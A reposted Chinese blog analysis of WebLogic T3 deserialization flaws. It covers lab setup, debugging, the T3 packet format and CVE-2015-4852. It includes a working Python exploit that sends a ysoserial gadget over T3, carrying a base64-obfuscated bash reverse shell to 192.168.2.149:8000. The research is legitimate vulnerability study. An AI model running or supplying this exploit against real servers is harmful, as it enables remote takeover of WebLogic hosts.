---
title: Weblogic 关于T3协议和二次反序列化分析
url: https://www.secpulse.com/archives/199253.html
source: 安全脉搏
date: 2023-04-21
fetch_date: 2025-10-04T11:31:26.792310
---

# Weblogic 关于T3协议和二次反序列化分析

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# Weblogic 关于T3协议和二次反序列化分析

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-04-20

14,233

##

文章转自先知社区：https://xz.aliyun.com/t/12397

作者：w0w

## 环境搭建

使用https://github.com/QAX-A-Team/WeblogicEnvironmentQAX的自动化搭建
参考：https://www.cnblogs.com/0x7e/p/14529949.html

（ps：ubuntu和centos，windows 感觉都不如kali来的润）
下载对应jdk和weblogic放到对应的文件夹

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969746.png)

然后就是修改Dockerfile，因为libnsl这个东西 会安装错误

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969750.png)

`vim Dockerfile`
把`RUN yum -y install libnsl`删除即可 （就只搭建环境浪费了我两天时间）

```
docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .
docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21F
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969752.png)

（垃圾），到之后从kali中提出文件的时候 会拖不到本地来......
（最后还是 windows本地搭建的，在docker中走代理）

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969753.png)

### 远程调试

```
mkdir ./middleware
mkdir -p ./coherence_3.7/lib
docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./middleware/
docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver ./middleware/
docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib
```

直接拉到本地

> 如果不想这么麻烦的话可以直接运行对于的.sh脚本，比如这里安装的是1036 jdk是7u21 ，直接运行run\_weblogicjdk7u21.sh，自动安装以及自动从容器里面导出jar包。

新建一个web项目 然后
打开wlserver目录

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969754.png)

然后add library刚刚导出的`coherence_3.7/lib`和`modules`
配置远程调试

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969761.png)

点击debug

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969765.png)

如此便是可以debug了
（搭环境搭了三天了...........） 开团！！！

### 验证环境

`weblogic/wsee/jaxws/WLSServletAdapter.class`的handle方法打上断点(如果查不到使用全局搜索即可)
访问`http://127.0.0.1:7001/wls-wsat/CoordinatorPortType`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969769.png)

## 关于T3协议

T3协议是Weblogic用于通信的独有的一个协议，Weblogic Server的RMI通信使用它在其他区的Java程序(包括 服务端，客户端，以及其他实例)传输数据。

### T3协议的组成

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969771.png)

这里借一张图解释一下关于 T3协议的组成

> `ac ed 00 05`是反序列化标志，而在 T3 协议中每个序列化数据包前面都有`fe 01 00 00`，所以 T3 的序列化标志为`fe 01 00 00 ac ed 00 05`

并且在发送T3协议的时候 还可以发送多个序列化数据 ，可以替换其中一个的序列化数据 实现反序列化攻击。
借qax的一张图解释

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969774.png)

## 基于T3协议的漏洞

关于T3协议 最开始的漏洞是CVE-2015-4852，随后都是绕过官方的补丁例如：CVE-2016-0638、CVE-2016-3510、CVE-2018-2628、CVE-2020-2555、CVE-2020-2883

### CVE-2015-4852

在weblogic收到T3协议的时候
会在`weblogic/rjvm/InboundMsgAbbrev.class`类中进行反序列化操作的处理

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-16819697741.png)

这里重写了readObject
调用了`ServerChannelInputStream`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969775.png)

在`ServerChannelInputStream`中 重写了`resolveClass`但是其最终还是调用了父类的`resolveClass`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969778.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969781.png)

简单点说就是 ，resolveClass方法把类的序列化描述加工成该类的Class对象，所以这里也就是入口点
没有任何过滤的调用resolveClass ，可以加载恶意的Class对象
这里放入resolveClass的源码

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199253-1681969782.png)

### debug分析

POC：

```
from os import popenimport struct  # 负责大小端的转换import subprocessfrom sys import stdoutimport socketimport reimport binascii

def generatePayload(gadget, cmd):    YSO_PATH = "./ysoserial-all.jar"    popen = subprocess.Popen(['java', '-jar', YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)    return popen.stdout.read()

def T3Exploit(ip, port, payload):    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    sock.connect((ip, port))    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"    sock.sendall(handshake.encode())    data = sock.recv(1024)    data += sock.recv(1024)    compile = re.compile("HELO:(.*).0.false")    print(data.decode())    match = compile.findall(data.decode())    if match:        print("Weblogic: " + "".join(match))    else:        print("Not Weblogic")        return    header = binascii.a2b_hex(b"00000000")    t3header = binascii.a2b_hex(        b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")    desflag = binascii.a2b_hex(b"fe010000")    payload = header + t3header + desflag + payload    payload = struct.pack(">I", len(payload)) + payload[4:]    sock.send(payload)

if __name__ == "__main__":    ip = "127.0.0.1"    port = 7001    gadget = "CommonsCollections1"    cmd = "bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4yLjE0OS84MDAwIDwmMSc=}|{base64,-d}|{bash,-i}"    payload = generatePayload(gadget, cmd)    T3Exploit(ip, port, payload)
```

var1是我们输入的序列化数据

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com...